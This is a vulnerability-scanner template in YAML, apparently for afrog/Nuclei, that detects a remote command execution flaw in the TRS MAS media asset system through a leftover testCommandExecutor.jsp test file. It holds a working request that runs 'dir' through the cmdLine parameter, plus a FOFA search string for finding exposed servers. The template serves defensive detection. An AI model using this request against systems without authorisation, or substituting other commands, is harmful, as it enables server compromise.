# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - D:\TRS\TRSMAS\
        case-insensitive: true
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv='
id: trs-testcommandexecutor-rce
info:
  author: zan8in
  description: |-
    拓尔思 MAS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限
    fofa: "MAS媒资管理系统登录页面"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 拓尔思 TRS testCommandExecutor.jsp 远程命令执行
  severity: high
  tags: trs,rce,argus-import
